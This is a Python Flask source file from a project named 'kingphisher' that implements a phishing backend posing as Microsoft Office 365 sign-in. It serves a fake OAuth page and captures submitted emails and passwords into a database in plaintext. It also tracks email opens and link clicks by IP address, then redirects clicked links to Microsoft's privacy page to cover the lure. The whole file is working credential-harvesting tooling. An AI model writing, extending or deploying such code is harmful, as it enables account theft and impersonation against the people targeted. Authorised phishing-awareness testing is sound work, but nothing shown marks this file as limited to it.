from flask import Flask, render_template, redirect, request, Blueprint
from kingphisher import db
from kingphisher.models import User, Key

users = Blueprint('users',__name__)


@users.route("/common/oauth2/authorize",  methods=['GET'])
@users.route("/",  methods=['GET'] )
def check_guid():
    valid_id = False
    email = ''
    client_id = request.args.get('client_id')
    if len(str(client_id)) > 0 and client_id is not None:
        key = validate_client_id(client_id)
        if key:
            ip_address = get_client_ip(request)
            increment_visit(key, ip_address)
            user = get_user_by_key_id(key.id)
            if user:
                valid_id = True
                email = user.email
        else:
            pass
    return render_template("o365/index.html", valid_id=valid_id, email=email)


@users.route("/api/register",  methods=['POST'])
def register():
    json = request.get_json()
    ip_address = get_client_ip(request)
    client_id = json['client_id']
    key = validate_client_id(client_id)

    if key and key.count <= 5:
        email = json['email']
        password = json['password']
        if create_user(email, password, key.id, ip_address):
            increment_key(key)
    return render_template("error/404.html")


@users.route("/api/v2/tracking/method/Click",  methods=['GET'])
def track():
    try:
        client_id = request.args.get('mi')
        ip_address = get_client_ip(request)
        key = validate_client_id(client_id)
        if key:
            increment_clicks(key.id, ip_address)
    except:
        pass
    finally:
        return redirect("https://privacy.microsoft.com/en-gb/privacystatement", code=302)


@users.route("/api/v2/tracking/method/open",  methods=['GET'])
def opened():
    try:
        client_id = request.args.get('img')
        ip_address = get_client_ip(request)
        key = validate_client_id(client_id)
        if key:
            increment_opened(key.id, ip_address)
    except:
        pass
    finally:
        return render_template("error/404.html")

def get_client_ip(request):
    try:
        if request.headers.getlist("X-Forwarded-For"):
            return request.headers.getlist("X-Forwarded-For")[0].split(',')[0]
        else:
            return "NONE"
    except:
        return "EXCEPT"

def validate_client_id(client_id):
    if len(str(client_id)) > 0 and client_id is not None:
        try:
            return Key.query.filter_by(key_value=client_id).first()
        except:
            return False

def get_user_by_key_id(id):
    return User.query.filter_by(key_id=id).first()


def create_user(email, password, key_id, ip_address):
    user = User(email=email,
                password=password,
                key_id=key_id,
                ip_address=ip_address)
    db.session.add(user)
    try:
        db.session.commit()
        return user
    except:
        db.session.rollback()


def increment_key(key):
    key.count = key.count + 1
    update_db()


def increment_visit(key, ip_address):
    key.visit = key.visit + 1
    key.visit_ip_address = ip_address
    update_db()


def increment_clicks(key, ip_address):
    key.clicked = key.clicked + 1
    key.clicked_ip_address = ip_address
    update_db()

def increment_opened(key, ip_address):
    key.opened = key.opened + 1
    key.opened_ip_address = ip_address
    update_db()

def update_db():
    try:
        db.session.commit()
    except:
        db.session.rollback()